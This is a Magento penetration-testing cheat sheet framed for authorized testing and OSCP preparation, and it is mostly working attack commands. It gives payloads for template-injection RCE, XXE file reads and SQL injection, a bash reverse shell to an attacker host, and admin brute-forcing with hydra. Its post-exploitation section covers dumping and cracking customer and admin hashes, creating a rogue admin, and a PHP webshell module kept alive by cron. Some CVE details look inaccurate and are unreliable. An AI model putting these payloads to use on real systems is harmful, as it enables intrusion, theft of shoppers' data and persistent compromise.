# Magento (Adobe Commerce)

> Magento CMS / e-commerce platform reference for penetration testing. Covers
> detection, enumeration, known CVEs, exploitation patterns, misconfigurations,
> and post-exploitation.

---

## Table of Contents

- [1. Detection](#1-detection)
- [2. Enumeration](#2-enumeration)
- [3. Known CVEs](#3-known-cves)
- [4. Exploitation Patterns](#4-exploitation-patterns)
- [5. Misconfigurations](#5-misconfigurations)
- [6. Post-Exploitation](#6-post-exploitation)
- [7. OSCP Notes](#7-oscp-notes)
- [8. References](#8-references)

---

## 1. Detection

### HTML markers

```bash
curl -s http://<TARGET>/ | grep -iE 'magento|mage/|/static/version|requirejs'
```

Expected output:

```html
<script type="text/x-magento-init">{...}</script>
<link rel="stylesheet" href="/static/version1234567890/frontend/..." />
<script src="/static/version1234567890/frontend/Magento/luma/en_US/requirejs/require.js"></script>
<meta name="generator" content="Magento 2" />
```

Strong fingerprints:
- `type="text/x-magento-init"` script tags (Magento 2)
- `/static/version<digits>/` asset URLs (Magento 2 with production mode)
- `/skin/frontend/` (Magento 1)
- `mage/cookies` JS module
- `requirejs` config with `magento` namespace
- `/pub/static/` and `/pub/media/` paths

### Response headers

```bash
curl -sI http://<TARGET>/ | grep -iE '^(server|set-cookie|x-magento)'
```

Expected output:

```text
X-Magento-Cache-Debug: MISS
X-Magento-Tags: ...
Set-Cookie: PHPSESSID=...; path=/; HttpOnly
Set-Cookie: X-Magento-Vary=...; path=/; HttpOnly
Set-Cookie: form_key=...; path=/
```

`X-Magento-*` headers, `form_key` cookie, and `X-Magento-Vary` cookie are
definitive.

### Magento 1 vs Magento 2

| Signal | Magento 1 | Magento 2 |
|--------|-----------|-----------|
| `/skin/frontend/` | Yes | No |
| `/static/version.../` | No | Yes |
| `/pub/static/` | No | Yes |
| `X-Magento-*` headers | Rare | Common |
| `/admin` (M1) vs `/admin_xyz` (M2) | `/admin` | Custom path |
| `MAGE_*` env vars | No | `MAGENTO_*` |

### Default files

- `/admin` (M1) or custom admin path (M2)
- `/downloader/` (M1) - Magento Connect manager
- `/js/mage/` (M1)
- `/skin/frontend/` (M1)
- `/static/` (M2)
- `/pub/static/` (M2)
- `/pub/media/` (M2)
- `/app/etc/env.php` (M2) - config (**never served**, but `.bak` may leak)
- `/app/etc/local.xml` (M1) - config (often exposed via path traversal)
- `/install.php` (M1 legacy)
- `/setup/` (M2 setup wizard)
- `/cron.php` - scheduled tasks
- `/errors/` - error pages

### Version

```bash
# M1: /app/etc/local.xml (if exposed)
curl -s http://<TARGET>/app/etc/local.xml | head -30

# M2: composer.json / setup info
curl -s http://<TARGET>/composer.json

# M2: version in /magento_version
curl -s http://<TARGET>/magento_version

# M2: /static/version<digits> in asset URLs
curl -s http://<TARGET>/ | grep -oE '/static/version[0-9]+'
```

### magescan

```bash
git clone https://github.com/steverobbins/magescan.git
cd magescan
php bin/magescan scan:all http://<TARGET>/
```

Magescan enumerates: version, modules, downloadable files, patch status.

---

## 2. Enumeration

### Version

```bash
# Method 1: /magento_version
curl -s http://<TARGET>/magento_version

# Method 2: composer.json
curl -s http://<TARGET>/composer.json | jq '.require["magento/product-community-edition"]'

# Method 3: static asset version
curl -s http://<TARGET>/ | grep -oE 'static/version[0-9]+'

# Method 4: magescan
php bin/magescan scan:version http://<TARGET>/
```

### Admin panel path (M2)

Magento 2 lets admins rename `/admin` to a custom path (e.g. `/admin_abc123`).
Brute force common patterns:

```bash
for p in admin admin_ adminpanel magentoadmin backend_admin manage admin1; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>/$p")
  echo "$code  /$p"
done
```

Also try the leaked admin URL from JS files or error pages.

### Admin path from JS

```bash
curl -s http://<TARGET>/ | grep -oE '/[a-zA-Z0-9_-]+/admin'
curl -s http://<TARGET>/static/version*/frontend/*/*/*/*.js | grep -oE 'adminUrl[^,]+'
```

### Common paths

```bash
for p in /admin /downloader /install.php /setup /cron.php /errors/ \
         /index.php/admin /index.php/downloader /api/rest /rest/V1 \
         /app/etc/local.xml /app/etc/env.php /composer.json /magento_version; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>$p")
  echo "$code  $p"
done
```

### REST API enumeration (M2)

```bash
curl -s http://<TARGET>/rest/V1/store/storeConfigs | jq .
curl -s http://<TARGET>/rest/V1/store/storeViews | jq .
curl -s http://<TARGET>/rest/V1/directory/countries | jq . | head -20
curl -s http://<TARGET>/rest/V1/products | jq .
```

Many endpoints are unauthenticated. `/rest/V1/customers` requires auth but
`/rest/V1/products` may not.

### GraphQL (M2 2.3+)

```bash
curl -s -X POST http://<TARGET>/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{storeConfig{store_name,base_url,secure_base_url}}"}'
```

Introspection (often enabled):

```bash
curl -s -X POST http://<TARGET>/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name}}}"}' | jq '.data.__schema.types[].name'
```

Customer queries (may be unauthenticated in misconfigs):

```bash
curl -s -X POST http://<TARGET>/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{customer{email,firstname,lastname}}"}'
```

### /errors/ directory

Magento stores error reports in `/var/report/` but proxies them via `/errors/`:

```bash
curl -s http://<TARGET>/errors/default/report
curl -s http://<TARGET>/errors/404
```

If accessible, error pages reveal paths, DB errors, module names.

### Magento 1 specific paths

```bash
for p in /downloader /downloader/index.php /api/soap /api/xmlrpc \
         /app/etc/local.xml /app/etc/config.xml /admin /index.php/admin; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>$p")
  echo "$code  $p"
done
```

### Magento 2 specific paths

```bash
for p in /pub/static /pub/media /setup /update /admin_xyz /rest/V1 \
         /graphql /health_check.php /static/version* /index.php/admin; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>$p")
  echo "$code  $p"
done
```

### Backup files

```bash
for f in app/etc/local.xml.bak app/etc/local.xml.old app/etc/env.php.bak \
         app/etc/env.php.old var/backups/ var/log/ backup.sql dump.sql \
         magento.tar.gz magento.zip; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>/$f")
  echo "$code  $f"
done
```

### var/log, var/report

```bash
curl -s http://<TARGET>/var/log/
curl -s http://<TARGET>/var/log/system.log
curl -s http://<TARGET>/var/log/exception.log
curl -s http://<TARGET>/var/report/
```

### /downloader (M1 Magento Connect Manager)

```bash
curl -s http://<TARGET>/downloader/
curl -s http://<TARGET>/downloader/index.php
```

Default creds in many old installs: same as admin.

### Cron

```bash
curl -sI http://<TARGET>/cron.php
```

### magescan full

```bash
php bin/magescan scan:all http://<TARGET>/
```

Output: version, patches, modules, downloadable files.

### Sitemap / robots

```bash
curl -s http://<TARGET>/sitemap.xml
curl -s http://<TARGET>/robots.txt
```

---

## 3. Known CVEs

Magento has a mix of core and extension CVEs. Core CVEs are often patched but
many installs lag behind.

### Magento 1 CVEs

#### CVE-2015-1397 - SQL injection (REST API)

Unauthenticated SQL injection via REST API endpoint.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2015-1397
Affected: Magento CE < 1.9.1.0, EE < 1.14.1.0.

#### CVE-2016-4010 - Unserialize RCE (Magento 1)

Unauthenticated RCE via `unserialize()` in REST API handling.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2016-4010
Affected: Magento CE < 1.9.2.1, EE < 1.14.2.1.

PoC:

```bash
curl -X POST http://<TARGET>/index.php/rest/V1/guest-carts/1/estimate-shipping-methods \
  -H "Content-Type: application/json" \
  -d '{"address":{"country_id":"US","region_id":1,"postcode":"12345","street":["`echo test`"]}}'
```

Actually the CVE-2016-4010 is more complex - use the public PoC:
https://github.com/tommyhopponen/CVE-2016-4010

#### CVE-2016-4010 - Unserialize RCE (Shoplift)

Same CVE family - `Shoplift` exploit chains multiple vulnerabilities.

#### CVE-2017-5930 - API user creation

NVD: https://nvd.nist.gov/vuln/detail/CVE-2017-5930

#### CVE-2019-7139 - SQL injection (Magento 2 API)

Unauthenticated SQL injection via `/rest/V1/guest-carts/{quoteId}/items`.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2019-7139
Affected: Magento 2.1.x, 2.2.x, 2.3.x.

PoC:

```bash
curl -s "http://<TARGET>/rest/V1/guest-carts/1/items" -X POST \
  -H "Content-Type: application/json" \
  -d '{"cartItem":{"sku":"1' AND SLEEP(5)--","qty":1,"quote_id":"1"}}'
```

### Magento 2 CVEs

#### CVE-2022-24086 - Unauthenticated RCE (Critical)

**Extremely high impact.** Unauthenticated RCE in email template processing.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2022-24086
Affected: Magento 2.3.x < 2.3.7-p2, 2.4.x < 2.4.3-p1.

PoC:

```bash
curl -X POST "http://<TARGET>/rest/V1/guest-carts/1/estimate-shipping-methods" \
  -H "Content-Type: application/json" \
  -d '{
    "address": {
      "country_id": "US",
      "region_id": 1,
      "postcode": "12345",
      "street": ["{{var this.getTemplateFilter().filter(\"id\")}}"]
    }
  }'
```

Or via customer email:

```bash
curl -X POST "http://<TARGET>/rest/V1/customers" \
  -H "Content-Type: application/json" \
  -d '{
    "customer": {
      "email": "{{var this.getTemplateFilter().filter(\"id\")}}@example.com",
      "firstname": "test",
      "lastname": "test"
    },
    "password": "Test123!"
  }'
```

#### CVE-2022-24087 - RCE bypass

Bypass for CVE-2022-24086 patch.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2022-24087
Affected: Magento 2.3.x < 2.3.7-p3, 2.4.x < 2.4.3-p2.

#### CVE-2021-21023 - Auth bypass in admin

NVD: https://nvd.nist.gov/vuln/detail/CVE-2021-21023

#### CVE-2021-28578 - XXE

NVD: https://nvd.nist.gov/vuln/detail/CVE-2021-28578

#### CVE-2022-35698 - Stored XSS (admin)

NVD: https://nvd.nist.gov/vuln/detail/CVE-2022-35698
Affected: Magento 2.4.4-p1 and earlier, 2.4.5.

#### CVE-2023-29247 - XSS

NVD: https://nvd.nist.gov/vuln/detail/CVE-2023-29247
Affected: Magento 2.4.5-p1 and earlier, 2.4.6.

#### CVE-2024-20720 - OS command injection

Unauthenticated OS command injection via crafted configuration.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2024-20720
Affected: Magento 2.4.4-p6 and earlier, 2.4.5-p5 and earlier, 2.4.6-p3 and earlier.

PoC: uses `{{config path="..."}}` in email template with a malicious config
value.

#### CVE-2024-34102 - CosmicSting (Unauthenticated XXE -> RCE)

**Critical, mass-exploited in 2024.** Unauthenticated XXE via REST API.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2024-34102
Affected: Magento 2.4.7 and earlier, 2.4.6-p5 and earlier, 2.4.5-p7 and earlier, 2.4.4-p8 and earlier.

PoC:

```bash
curl -X POST "http://<TARGET>/rest/V1/guest-carts/1/estimate-shipping-methods" \
  -H "Content-Type: application/json" \
  -d '{"address":{"totalsCollector":{"collectorList":{"totalCollector":{"sourceData":{"data":"<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><r>&xxe;</r>","dataIsURL":false,"sourceCountry":"US"}}}}}}'
```

Full exploit chains to RCE via deserialization (using the leaked `crypt.key`
from `env.php`).

Public exploit: https://github.com/spacewasp/public_docs/blob/main/CVE-2024-34102.md

#### CVE-2024-34108 / CVE-2024-34109 / CVE-2024-34110 - related

Additional Magento 2 CVEs from the CosmicSting family.

### Popular extension CVEs

#### CVE-2020-37174 - Magento 2 Elasticsearch

NVD: https://nvd.nist.gov/vuln/detail/CVE-2020-37174

#### CVE-2020-6633 - TinyMCE (bundled in Magento)

NVD: https://nvd.nist.gov/vuln/detail/CVE-2020-6633

#### CVE-2021-32763 - Zend/Laminas

NVD: https://nvd.nist.gov/vuln/detail/CVE-2021-32763

### Version -> CVE quick table

| Version | Type | CVE |
|---------|------|-----|
| Magento 1 CE < 1.9.1.0 | SQLi | CVE-2015-1397 |
| Magento 1 CE < 1.9.2.1 | Unserialize RCE | CVE-2016-4010 |
| Magento 2.1-2.3 | SQLi | CVE-2019-7139 |
| Magento 2.3 < 2.3.7-p2 | RCE | CVE-2022-24086 |
| Magento 2.3 < 2.3.7-p3 | RCE bypass | CVE-2022-24087 |
| Magento 2.4.x < 2.4.7 | XXE RCE | CVE-2024-34102 |
| Magento 2.4.x < 2.4.6-p3 | OS injection | CVE-2024-20720 |

---

## 4. Exploitation Patterns

### CVE-2022-24086 - Unauthenticated RCE

```bash
# 1. Get a guest cart ID
CART=$(curl -s -X POST http://<TARGET>/rest/V1/guest-carts | jq -r .)
echo "Cart: $CART"

# 2. Trigger the email template injection
curl -s -X POST "http://<TARGET>/rest/V1/guest-carts/$CART/estimate-shipping-methods" \
  -H "Content-Type: application/json" \
  -d '{
    "address": {
      "country_id": "US",
      "region_id": 1,
      "postcode": "12345",
      "street": ["{{var this.getTemplateFilter().filter(\"id\")}}"]
    }
  }'
```

Or with a reverse shell payload:

```bash
curl -s -X POST "http://<TARGET>/rest/V1/guest-carts/$CART/estimate-shipping-methods" \
  -H "Content-Type: application/json" \
  -d '{
    "address": {
      "country_id": "US",
      "region_id": 1,
      "postcode": "12345",
      "street": ["{{var this.getTemplateFilter().filter(\"bash -c 'bash -i >& /dev/tcp/<attacker>/4444 0>&1'\")}}"]
    }
  }'
```

### CVE-2024-34102 - CosmicSting (XXE -> RCE)

```bash
# Step 1: XXE file read
curl -X POST "http://<TARGET>/rest/V1/guest-carts/1/estimate-shipping-methods" \
  -H "Content-Type: application/json" \
  -d '{"address":{"totalsCollector":{"collectorList":{"totalCollector":{"sourceData":{"data":"<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><r>&xxe;</r>","dataIsURL":false,"sourceCountry":"US"}}}}}}'

# Step 2: Read app/etc/env.php to get crypt.key
curl -X POST "http://<TARGET>/rest/V1/guest-carts/1/estimate-shipping-methods" \
  -H "Content-Type: application/json" \
  -d '{"address":{"totalsCollector":{"collectorList":{"totalCollector":{"sourceData":{"data":"<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY xxe SYSTEM \"file:///var/www/html/app/etc/env.php\">]><r>&xxe;</r>","dataIsURL":false,"sourceCountry":"US"}}}}}}'

# Step 3: Use crypt.key to forge admin session / trigger deserialization
# Full exploit: https://github.com/Chocapikk/CVE-2024-34102
```

### Magento 1 - Shoplift RCE

Complex exploit chaining CVE-2015-1397, CVE-2016-4010, CVE-2017-5930.

Use public tools:

```bash
# Full exploit for Magento 1 RCE
git clone https://github.com/yt0ng/CVE-2016-4010
# Or:
git clone https://github.com/tommyh-io/CVE-2016-4010
```

Metasploit: `exploit/multi/http/magento_unserialize`.

### Admin panel -> RCE

With admin creds (M1):

1. `System -> Magento Connect -> Magento Connect Manager`
2. Install an extension with malicious PHP.
3. Or navigate to `System -> Configuration` -> inject into config that gets
   evaluated.

With admin creds (M2):

1. Navigate to `Content -> Design -> Configuration`.
2. Edit a template file to include PHP.
3. Or install a custom module via `System -> Web Setup Wizard` (if enabled).

Alternatively, upload a custom theme with a backdoor in `functions.php`
(equivalent for Magento).

### REST API user enumeration

```bash
# Check if customer email is registered
curl -X POST "http://<TARGET>/rest/V1/customers/isEmailAvailable" \
  -H "Content-Type: application/json" \
  -d '{"customerEmail":"test@example.com"}'
# {"isEmailAvailable":true} -> not registered
# {"isEmailAvailable":false} -> registered
```

### GraphQL customer enumeration

```bash
curl -X POST http://<TARGET>/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{isEmailAvailable(email: \"admin@example.com\")}"}'
```

### Admin path via Magento CLI

If you have shell access:

```bash
php bin/magento info:adminuri
php bin/magento config:show
```

### Password reset token abuse

Magento password reset tokens can be predicted in some versions.
Check with CVE-2020-13564 (prototype pollution in password reset).

### Magento 1 - Admin brute force

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt <TARGET> \
  http-post-form "/index.php/admin/index/login:login[username]=^USER^&login[password]=^PASS^:Invalid User Name"
```

Magento has rate limiting by default. Try with throttle:

```bash
hydra -l admin -P rockyou.txt -t 1 -W 5 <TARGET> \
  http-post-form "/index.php/admin/index/login:login[username]=^USER^&login[password]=^PASS^:Invalid User Name"
```

### Magento 2 - Admin brute force

```bash
hydra -l admin -P rockyou.txt -t 1 -W 5 <TARGET> \
  http-post-form "/admin_xyz/admin/index/login:login[username]=^USER^&login[password]=^PASS^:Incorrect"
```

### Magento 1 - /downloader default creds

```bash
curl -s -u admin:password http://<TARGET>/downloader/index.php
```

If `admin:password` matches the admin credentials -> Magento Connect Manager
gives full extension install -> RCE.

---

## 5. Misconfigurations

### Admin path not renamed (M2)

Default `/admin` on Magento 2 is insecure. If not renamed, admin brute force
becomes easier.

```bash
curl -s -o /dev/null -w "%{http_code}\n" http://<TARGET>/admin
```

### /downloader accessible (M1)

```bash
curl -s -o /dev/null -w "%{http_code}\n" http://<TARGET>/downloader/
```

Extension manager -> RCE.

### local.xml exposed (M1)

```bash
curl -s http://<TARGET>/app/etc/local.xml
```

Contains DB credentials, encryption key.

### env.php exposed (M2)

```bash
for f in app/etc/env.php app/etc/env.php.bak app/etc/env.php.old app/etc/env.php~; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>/$f")
  echo "$code  $f"
done
```

Contains DB creds, crypt key, admin URL.

### Backup files

```bash
for f in backup.zip backup.tar.gz var/backups/ magento.zip dump.sql \
         database.sql var/log/system.log var/log/exception.log; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>/$f")
  echo "$code  $f"
done
```

### Error pages enabled

Magento error pages can leak paths, DB error details, module names:

```bash
curl -s "http://<TARGET>/nonexistent-%00"
curl -s "http://<TARGET>/index.php/'"
```

### Unprotected REST API

```bash
curl -s http://<TARGET>/rest/V1/products | jq .
curl -s http://<TARGET>/rest/V1/categories | jq .
```

If products / categories returned without auth -> product scraping, price leaks.

### GraphQL introspection enabled

```bash
curl -s -X POST http://<TARGET>/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name fields{name}}}}"}' | jq .
```

Full schema -> all queries/mutations including hidden ones.

### Missing security headers

```bash
curl -sI http://<TARGET>/ | grep -iE 'strict-transport|content-security-policy|x-frame-options'
```

### Debug mode

```bash
curl -s http://<TARGET>/ | grep -i 'debug\|developer'
```

### Version disclosure

```bash
curl -s http://<TARGET>/magento_version
curl -s http://<TARGET>/composer.json
```

### Verbose X-Magento-Tags

```bash
curl -sI http://<TARGET>/ | grep -i x-magento-tags
```

Reveals cache tags -> internal entity IDs, module names.

### Redis exposed (M2 uses Redis for cache/sessions)

```bash
nmap -p 6379 <TARGET>
redis-cli -h <TARGET>
> keys *
> get admin:...
```

Magento 2 session storage in Redis -> if Redis has no auth, forge admin
session.

---

## 6. Post-Exploitation

### Config file locations

| Version | Path |
|---------|------|
| M1 | `/var/www/html/app/etc/local.xml` |
| M2 | `/var/www/html/app/etc/env.php` |
| M2 (override) | `/var/www/html/app/etc/env.local.php` |
| M2 cache config | `/var/www/html/app/etc/config.php` |

### What to look for

```bash
cat /var/www/html/app/etc/local.xml  # M1
cat /var/www/html/app/etc/env.php    # M2
```

Key items:

- `db` -> DB host, user, password, dbname
- `crypt.key` (M2) -> session cookie encryption / form key signing
- `encryption_key` (M1) -> same
- `session` / `redis` -> Redis host, port, password
- `cache` -> cache backend
- `admin` / `admin_uri` (M2) -> admin path
- `resource` -> DB resource config

### Database access

```bash
# M1 config: local.xml
# M2 config: env.php

mysql -h <host> -u <user> -p<password> <dbname>
```

Dump admin users (M1):

```sql
SELECT username, password, email FROM admin_user;
```

Dump admin users (M2):

```sql
SELECT username, password, email FROM admin_user;
```

Dump customers (M2):

```sql
SELECT entity_id, email, firstname, lastname FROM customer_entity;
SELECT * FROM customer_entity_varchar WHERE attribute_id = (SELECT attribute_id FROM eav_attribute WHERE attribute_code = 'password_hash');
```

### Cracking Magento password hashes

Magento uses SHA-256 with salt (format: `<hash>:<salt>`):

Hashcat mode 1420 (M1) or 20720 (M2):

```bash
# M1
hashcat -m 1420 magento_hashes.txt rockyou.txt
# M2
hashcat -m 20720 magento_hashes.txt rockyou.txt
```

Format: `<32-hex-hash>:<32-hex-salt>`.

### Crypt key abuse (M2)

`crypt.key` from `env.php` is used for:
- Session cookie encryption
- Form key signing (CSRF)
- Password reset tokens

With `crypt.key`, forge admin sessions:

```bash
# Use a tool like Magento-Crypt-Key-Exploit or manual forging
# Session cookie format: adminhtml=<encrypted>
```

Or decrypt any captured session cookie.

### Redis abuse (M2)

If `env.php` reveals Redis with no password:

```bash
redis-cli -h <redis>
> keys *
> get admin:...  # admin session data
> lrange ... 0 -1
```

Magento 2 stores sessions in Redis -> hijack admin sessions.

### Magento CLI (M2)

With shell access:

```bash
cd /var/www/html
php bin/magento info:adminuri
php bin/magento config:show
php bin/magento admin:user:create --admin-user=attacker --admin-password=Test123! --admin-email=attacker@evil.com --admin-firstname=A --admin-lastname=B
php bin/magento cache:flush
```

`admin:user:create` creates a new admin -> full control.

### Logs

```bash
tail -n 200 /var/www/html/var/log/system.log
tail -n 200 /var/www/html/var/log/exception.log
tail -n 200 /var/log/apache2/access.log | grep admin
```

Magento 2 logs include: failed logins, exceptions with stack traces, module
versions.

### var/report

```bash
ls -la /var/www/html/var/report/
cat /var/www/html/var/report/* 2>/dev/null
```

Error reports contain stack traces + memory dumps.

### Private uploads

```bash
ls -la /var/www/html/pub/media/
ls -la /var/www/html/media/  # M1
```

Customer uploads, invoices, product images. Sometimes contain PII.

### Persistence via custom module

Create a module in `/app/code/local/Evil/Shell/` (M1) or
`/app/code/Evil/Shell/` (M2) with a controller that responds to a secret URL.

```php
// M2: app/code/Evil/Shell/Controller/Index/Index.php
namespace Evil\Shell\Controller\Index;
use Magento\Framework\App\Action\Action;
use Magento\Framework\App\Action\Context;
class Index extends Action {
  public function execute() {
    if (isset($_GET['cmd'])) { system($_GET['cmd']); exit; }
  }
}
```

Register the module (`registration.php`, `etc/module.xml`, `etc/routes.xml`)
then:

```bash
php bin/magento setup:upgrade
php bin/magento cache:flush
curl "http://<TARGET>/shell/index/index?cmd=id"
```

### Cron (M2)

Magento 2 cron runs scheduled jobs. Add a malicious cron task:

```php
// app/code/Evil/Shell/etc/crontab.xml
<?xml version="1.0"?>
<config>
  <group id="default">
    <job name="evil_job" instance="Evil\Shell\Cron\Evil" method="execute">
      <schedule>* * * * *</schedule>
    </job>
  </group>
</config>
```

The job runs on next cron cycle.

### Privilege escalation to root

Standard Linux privesc:

```bash
sudo -l
find / -perm -4000 -type f 2>/dev/null
uname -a
```

Magento runs as the web user (usually `www-data` or `nginx`). Standard privesc
via SUID, sudo, cron, or kernel exploit.

---

## 7. OSCP Notes

> [!IMPORTANT]
> OSCP report: screenshot the Magento version from `/magento_version` OR `/composer.json` OR the `X-Magento-Cache-*` headers - it proves the exact version.

> [!IMPORTANT]
> OSCP report: for CVE-2022-24086 or CVE-2024-34102, screenshot the exploit request AND the resulting command output / file read.

> [!IMPORTANT]
> OSCP report: for env.php / local.xml leak, screenshot the file content (with DB creds masked) AND at least one successful credential use (DB login or crypt key abuse).

---

## 8. References

- Magento official docs - https://developer.adobe.com/commerce/docs/
- Magento security bulletins - https://helpx.adobe.com/security/products/magento.html
- NVD search - https://nvd.nist.gov/vuln/search/results?query=magento
- magescan - https://github.com/steverobbins/magescan
- CVE-2022-24086 writeup - https://helpx.adobe.com/security/products/magento/apsb22-12.html
- CVE-2024-34102 CosmicSting - https://github.com/spacewasp/public_docs/blob/main/CVE-2024-34102.md
- Sansec CosmicSting analysis - https://sansec.io/research/cosmicsting
- HackTricks - Magento - https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/magento
- PHPGGC - https://github.com/ambionics/phpggc

---

*Reference for authorized penetration testing, CTF, and OSCP exam preparation only.*
